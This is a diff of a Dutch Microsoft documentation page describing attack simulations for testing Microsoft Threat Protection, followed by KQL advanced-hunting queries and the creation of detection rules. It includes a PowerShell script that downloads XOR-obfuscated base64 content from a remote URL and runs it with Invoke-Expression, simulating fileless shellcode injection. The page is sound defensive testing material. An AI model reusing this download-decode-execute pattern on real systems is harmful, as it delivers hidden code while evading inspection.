@@ -17,14 +17,15 @@ manager: dansimp
 audience: ITPro
 ms.collection:
 - M365-security-compliance
-- m365solution-evalutatemtp
+- m365solution-scenario
+- m365solution-pilotmtpproject
 ms.topic: conceptual
-ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
-ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
+ms.openlocfilehash: f165a34d5e9df2f3502a9d9c6230fed9b73b758b
+ms.sourcegitcommit: a83acd5b9eeefd2e20e5bac916fe29d09fb53de9
 ms.translationtype: MT
 ms.contentlocale: nl-NL
-ms.lasthandoff: 10/06/2020
-ms.locfileid: "48368091"
+ms.lasthandoff: 10/10/2020
+ms.locfileid: "48418143"
 ---
 # <a name="run-your-microsoft-threat-protection-attack-simulations"></a>Simulaties van aanvallen van Microsoft Threat Protection uitvoeren  
 
@@ -92,21 +93,23 @@ Tijdens de simulatie injecteert de aanval shellcode in een schijnbaar onschuldig
 Aangezien u de testomgeving al hebt geconfigureerd tijdens de voorbereidende fase, moet u ervoor zorgen dat u twee apparaten hebt voor dit scenario: een testapparaat en een domeincontroller.
 
 1.  Controleer of uw Tenant [Microsoft Threat Protection heeft ingeschakeld](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).
+
 2.  Controleer de configuratie van de domeincontroller voor testen:
+
     - Apparaat wordt uitgevoerd met Windows Server 2008 R2 of een latere versie.
     - De test domeincontroller naar [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) en schakelt [extern beheer](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)in.    
     - Controleer of de [beveiligings integratie van Azure ATP en Microsoft Cloud app](https://docs.microsoft.com/cloud-app-security/aatp-integration) is ingeschakeld.
     - Een testgebruiker wordt in uw domein gemaakt – geen beheerdersmachtigingen nodig.
 
 3.  Controleer de configuratie van de testapparatuur:
-    <br>
-    a.  Een apparaat met Windows 10 versie 1903 of een latere versie wordt uitgevoerd.
-    <br>
-    b.  Testapparaat is verbonden met het test domein.
-    <br>
-    c.  [Schakel Windows Defender antivirus in](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Als u problemen ondervindt bij het inschakelen van Windows Defender antivirus, raadpleegt u dit [onderwerp over probleemoplossing](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
-    <br>
-    d.  Controleer of het testapparaat is [geboardd naar Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).
+ 
+    1.  Een apparaat met Windows 10 versie 1903 of een latere versie wordt uitgevoerd.
+    
+    1.  Testapparaat is verbonden met het test domein.
+    
+    1.  [Schakel Windows Defender antivirus in](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). Als u problemen ondervindt bij het inschakelen van Windows Defender antivirus, raadpleegt u dit [onderwerp over probleemoplossing](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
+    
+    1.  Controleer of het testapparaat is [geboardd naar Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).
 
 Als u een bestaande Tenant gebruikt en apparaatgroepen implementeert, maakt u een speciale apparaatklasse voor het testapparaat en duwt u dit naar het hoogste niveau in de configuratie UX.
 
@@ -120,15 +123,17 @@ De simulatie van het aanvalsscenario uitvoeren:
 2.  Open een Windows PowerShell-venster op het testapparaat.
 
 3.  Kopieer het volgende simulatie script:
-```
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
-= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
--UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-```
->[!NOTE]
->Als u dit document opent in een webbrowser, kunt u problemen ondervinden met het kopiëren van de volledige tekst zonder dat u bepaalde tekens kwijtraakt of om extra regeleinden te voorkomen. Download dit document en open het in Adobe Reader.
+
+    ```powershell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
+    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
+    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+    
+    > [!NOTE]
+    > Als u dit document opent in een webbrowser, kunt u problemen ondervinden met het kopiëren van de volledige tekst zonder dat u bepaalde tekens kwijtraakt of om extra regeleinden te voorkomen. Download dit document en open het in Adobe Reader.
 
 4. Plak en voer het gekopieerde script uit wanneer u hierom wordt gevraagd.
 
@@ -141,7 +146,7 @@ De gesimuleerde aanvaller probeert met een extern IP-adres te communiceren (de C
 
 U ziet een bericht dat wordt weergegeven op de PowerShell-console wanneer dit script is voltooid.
 
-```
+```console
 ran NetSessionEnum against [DC Name] with return code result 0      
 ```
 
@@ -333,96 +338,98 @@ Er is één intern postvak en apparaat vereist voor dit scenario. U hebt ook een
 
 **Go-jacht**
 1.  Open de portal van security.microsoft.com.
+
 2.  Ga naar de **jacht > geavanceerde jacht**.
 
     ![Schermafbeelding van een geavanceerde jacht op de navigatiebalk van het M365 Security Center Portal](../../media/mtp/fig17.png) 
 
 3.  Maak een query die begint met het verzamelen van e-mail gebeurtenissen.
-    a.  Selecteer in het deelvenster query de optie Nieuw.
-    b.  Dubbelklik op de tabel EmailEvents van het schema.
 
-```
-EmailEvents 
-```                                        
+    1.  Selecteer in het deelvenster query de optie Nieuw.
+    
+    1.  Dubbelklik op de tabel EmailEvents van het schema.
 
-   c.   De laatste 24 uur van het tijdsbestek wijzigen. Ervan uitgaand dat de e-mail die u hebt verzonden toen u de bovenstaande simulatie uitvoerde, stond in de afgelopen 24 uur, anders wijzigt u de tijdsperiode.
-   ![Schermafbeelding van de locatie waar u de periode kunt wijzigen. De vervolgkeuzelijst openen om te kiezen uit een tijdsbestek](../../media/mtp/fig18.png) 
+        ```
+        EmailEvents 
+        ```                                        
 
+    1.  De laatste 24 uur van het tijdsbestek wijzigen. Ervan uitgaand dat de e-mail die u hebt verzonden toen u de bovenstaande simulatie uitvoerde, stond in de afgelopen 24 uur, anders wijzigt u de tijdsperiode.
+    
+        ![Schermafbeelding van de locatie waar u de periode kunt wijzigen. De vervolgkeuzelijst openen om te kiezen uit een tijdsbestek](../../media/mtp/fig18.png) 
 
-   d.   Voer de query uit.  Het kan zijn dat u veel resultaten hebt, afhankelijk van de omgeving van de prototype.  
+    1.  Voer de query uit.  Het kan zijn dat u veel resultaten hebt, afhankelijk van de omgeving van de prototype.  
 
->[!NOTE]
->Zie de volgende stap voor het filteren van opties om het resultaat van de gegevens te beperken.
+        > [!NOTE]
+        > Zie de volgende stap voor het filteren van opties om het resultaat van de gegevens te beperken.
 
-   ![Schermafbeelding van de zoekresultaten van de geavanceerde jacht](../../media/mtp/fig19.png) 
+        ![Schermafbeelding van de zoekresultaten van de geavanceerde jacht](../../media/mtp/fig19.png) 
 
->[!NOTE]
->Geavanceerde jacht geeft queryresultaten weer als tabelgegevens. U kunt ook kiezen voor het weergeven van de gegevens in andere notatie typen, zoals grafieken.    
+        > [!NOTE]
+        > Geavanceerde jacht geeft queryresultaten weer als tabelgegevens. U kunt ook kiezen voor het weergeven van de gegevens in andere notatie typen, zoals grafieken.    
 
-   e.   Bekijk de resultaten en kijk of u het e-mailbericht dat u hebt geopend kunt identificeren.  Het kan tot 2 uur duren voordat het bericht in de geavanceerde jacht wordt weergegeven. Als de e-mail omgeving grote en veel resultaten bevat, kunt u de **optie filters weergeven** gebruiken om het bericht te zoeken. 
+    1.  Bekijk de resultaten en kijk of u het e-mailbericht dat u hebt geopend kunt identificeren.  Het kan tot 2 uur duren voordat het bericht in de geavanceerde jacht wordt weergegeven. Als de e-mail omgeving grote en veel resultaten bevat, kunt u de **optie filters weergeven** gebruiken om het bericht te zoeken. 
 
-   In het voorbeeld is het e-mailbericht verzonden via een Yahoo-account. Klik op het **+** pictogram naast **Yahoo.com** onder de sectie SenderFromDomain en klik vervolgens op **toepassen** om het geselecteerde domein toe te voegen aan de query.  U moet het domein of e-mailaccount gebruiken dat is gebruikt voor het verzenden van het testbericht in stap 1 van de simulatie uitvoeren om de resultaten te filteren.  Voer de query opnieuw uit om een kleinere resultatenset te krijgen om te controleren of het bericht in de simulatie wordt weergegeven.
+        In het voorbeeld is het e-mailbericht verzonden via een Yahoo-account. Klik op het **+** pictogram naast **Yahoo.com** onder de sectie SenderFromDomain en klik vervolgens op **toepassen** om het geselecteerde domein toe te voegen aan de query.  U moet het domein of e-mailaccount gebruiken dat is gebruikt voor het verzenden van het testbericht in stap 1 van de simulatie uitvoeren om de resultaten te filteren.  Voer de query opnieuw uit om een kleinere resultatenset te krijgen om te controleren of het bericht in de simulatie wordt weergegeven.
    
-   ![Schermafbeelding van de filters. U kunt filters gebruiken om de zoekopdracht te verfijnen en te vinden wat u zoekt.](../../media/mtp/fig20.png) 
+        ![Schermafbeelding van de filters. U kunt filters gebruiken om de zoekopdracht te verfijnen en te vinden wat u zoekt.](../../media/mtp/fig20.png) 
 
+        ```console
+        EmailEvents 
+        | where SenderMailFromDomain == "yahoo.com"
+        ```
 
-```
-EmailEvents 
-| where SenderMailFromDomain == "yahoo.com"
-```
-
-   f.   Klik op de uitkomst rijen van de query, zodat u de record kunt controleren.
-   ![Schermafbeelding van het deelvenster opnemen van de controle die wordt geopend wanneer een geavanceerd zoekresultaat wordt geselecteerd](../../media/mtp/fig21.png) 
-
+    1.  Klik op de uitkomst rijen van de query, zodat u de record kunt controleren.
+   
+        ![Schermafbeelding van het deelvenster opnemen van de controle die wordt geopend wanneer een geavanceerd zoekresultaat wordt geselecteerd](../../media/mtp/fig21.png) 
 
 4.  Nu u hebt gecontroleerd of u het e-mailbericht kunt zien, voegt u een filter toe voor de bijlagen. Richt u op alle e-mailberichten met bijlagen in de omgeving. Voor dit scenario zijn de focus op inkomende e-mailberichten, niet voor berichten die vanuit uw omgeving worden verzonden. Verwijder filters die u hebt toegevoegd om het bericht op te halen en voeg "| waarbij **AttachmentCount > 0** en **EmailDirection**  ==  **"inkomende" "**
 
-In de volgende query ziet u het resultaat voor een kortere lijst dan de aanvankelijke query voor alle e-mail gebeurtenissen:
+    In de volgende query ziet u het resultaat voor een kortere lijst dan de aanvankelijke query voor alle e-mail gebeurtenissen:
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
 
-```
+    ```
 
 5.  Neem vervolgens de informatie over de bijlage op (bijvoorbeeld: bestandsnaam, hashes) in de resultatenset. U kunt dit doen door lid te worden van de tabel **EmailAttachmentInfo** . De veelgebruikte velden die u kunt gebruiken om deel te nemen in dit geval zijn **NetworkMessageId** en **RecipientObjectId**.
 
-De volgende query bevat ook een extra regel | **Project: Wijzig de naam van EmailTimestamp = tijdstempel**, zodat u kunt zien welke tijdstempels zijn gerelateerd aan de e-mail en tijdstempels die te maken hebben met de volgende stap.
+    De volgende query bevat ook een extra regel | **Project: Wijzig de naam van EmailTimestamp = tijdstempel**, zodat u kunt zien welke tijdstempels zijn gerelateerd aan de e-mail en tijdstempels die te maken hebben met de volgende stap.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    ```
 
 6.  Gebruik vervolgens de waarde **sha256** in de tabel **EmailAttachmentInfo** om **DeviceFileEvents** (bestandsacties die op het eindpunt plaatsvond) voor die hash te zoeken.  Het veld gebruikelijk is de SHA256-hash voor de bijlage.
 
-De resultaattabel bevat nu gegevens uit het eindpunt (Microsoft Defender ATP), zoals de apparaatnaam, de actie die is uitgevoerd (in dit geval gefilterd op alleen FileCreated-gebeurtenissen) en de locatie waar het bestand is opgeslagen. De naam van het account dat is gekoppeld aan het proces, wordt ook opgenomen.
+    De resultaattabel bevat nu gegevens uit het eindpunt (Microsoft Defender ATP), zoals de apparaatnaam, de actie die is uitgevoerd (in dit geval gefilterd op alleen FileCreated-gebeurtenissen) en de locatie waar het bestand is opgeslagen. De naam van het account dat is gekoppeld aan het proces, wordt ook opgenomen.
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    ```
 
-U hebt nu een query gemaakt waarmee alle inkomende e-mailberichten worden geïdentificeerd waarbij de gebruiker de bijlage heeft geopend of opgeslagen. U kunt deze query ook verfijnen om te filteren op specifieke domeinen, bestanden, bestandstypen, enzovoort.
+    U hebt nu een query gemaakt waarmee alle inkomende e-mailberichten worden geïdentificeerd waarbij de gebruiker de bijlage heeft geopend of opgeslagen. U kunt deze query ook verfijnen om te filteren op specifieke domeinen, bestanden, bestandstypen, enzovoort.
 
 7.  Functies vormen een speciale combineren van joins waarmee u meer TI-gegevens over een bestand kunt halen, zoals de prevalente, onderteken-en uitgeversinformatie, enzovoort.  Als u meer wilt weten over het bestand, gebruikt u de functie verrijking **FileProfile ()** .
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-| distinct SHA1
-| invoke FileProfile()
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    | distinct SHA1
+    | invoke FileProfile()
+    ```
 
 
 **Een detectie maken**
@@ -435,15 +442,15 @@ Door aangepaste detecties wordt de query uitgevoerd volgens de frequentie die u 
     
     ![Schermafbeelding van waar u op detectieregel maken kunt klikken op de pagina Geavanceerde jacht](../../media/mtp/fig22.png) 
 
->[!NOTE]
->Als u klikt op **detectieregel maken** en er syntaxisfouten zijn in uw query, wordt uw detectieregel niet opgeslagen. Controleer de query om te controleren of er geen fouten zijn. 
+    > [!NOTE]
+    > Als u klikt op **detectieregel maken** en er syntaxisfouten zijn in uw query, wordt uw detectieregel niet opgeslagen. Controleer de query om te controleren of er geen fouten zijn. 
 
 
 2.  Vul de vereiste velden in met de gegevens waarmee het beveiligingsteam de melding begrijpt, waarom de melding is gegenereerd en welke acties u ervan verloopt. 
 
     ![Schermafbeelding van de pagina detectieregel maken waarop u de details van de waarschuwing kunt definiëren](../../media/mtp/fig23.png)
 
-Zorg ervoor dat u de velden vult met de duidelijkheid, zodat de volgende gebruiker een weloverwogen beslissing geeft over deze detectieregel waarschuwing 
+    Zorg ervoor dat u de velden vult met de duidelijkheid, zodat de volgende gebruiker een weloverwogen beslissing geeft over deze detectieregel waarschuwing 
 
 3.  Selecteer de entiteiten die in deze waarschuwing worden beïnvloed. Selecteer **apparaat** en **Postvak**in dit geval.
 
@@ -458,7 +465,7 @@ Zorg ervoor dat u de velden vult met de duidelijkheid, zodat de volgende gebruik
 
     ![Schermafbeelding van de pagina detectieregel maken waar u de verwachtingen voor de waarschuwingsregel kunt instellen voor de resultaten die u ziet](../../media/mtp/fig26.png) 
 
-Voor deze pilot kunt u de regel beperkingen toepassen op een subset van testapparaten in uw productieomgeving.
+    Voor deze pilot kunt u de regel beperkingen toepassen op een subset van testapparaten in uw productieomgeving.
 
 6.  Selecteer **Maken**.  Selecteer vervolgens **aangepaste detectieregels** in het navigatiedeelvenster.
  
@@ -466,9 +473,9 @@ Voor deze pilot kunt u de regel beperkingen toepassen op een subset van testappa
 
     ![Schermafbeelding van de pagina detectieregels waarop de regel en de details van de uitvoering worden weergegeven](../../media/mtp/fig27b.png) 
 
-Op deze pagina kunt u de detectieregel selecteren waarmee een detailpagina wordt geopend. 
+    Op deze pagina kunt u de detectieregel selecteren waarmee een detailpagina wordt geopend. 
 
-![Schermafbeelding van de pagina met e-mailbijlagen waarop u de status van de regel uitvoer, geactiveerde waarschuwingen en acties, de detectie bewerkt, enzovoort kunt zien](../../media/mtp/fig28.png) 
+    ![Schermafbeelding van de pagina met e-mailbijlagen waarop u de status van de regel uitvoer, geactiveerde waarschuwingen en acties, de detectie bewerkt, enzovoort kunt zien](../../media/mtp/fig28.png) 
 
 ### <a name="additional-advanced-hunting-walk-through-exercises"></a>Aanvullende geavanceerde jacht Walk-in-oefeningen
 
@@ -477,7 +484,7 @@ Als u meer wilt weten over een geavanceerde jacht, kunt u via de volgende webcas
 >[!NOTE]
 >Bereid u voor voorbereiding met uw eigen GitHub-account voor het uitvoeren van de jagers-query's in uw test testomgeving.  
 
-| **Title** | **Beschrijving** | **MP4 downloaden** | **Op YouTube letten** | **CSL-bestand voor gebruik** |
+|  Title  |  Beschrijving  |  MP4 downloaden  |  Op YouTube letten  |  CSL-bestand voor gebruik  |
 |:-----|:-----|:-----|:-----|:-----|
 | Aflevering 1: basisprincipes van KQL | We bespreken de basisbeginselen van de geavanceerde jacht functies in Microsoft Threat Protection. Lees meer over de beschikbare geavanceerde jacht-gegevens en de Basic KQL syntaxis en operatoren. | [ MP4](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [Aflevering 1: CSL-bestand in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
 | Aflevering 2: joins | We gaan verder met het leren van gegevens in de geavanceerde jacht en het samenvoegen van tabellen. Meer informatie over binnenste, Outer, unieke en semi joins en de nuances van de standaard Kusto innerunique join. | [MP4](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [Aflevering 2: CSL-bestand in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
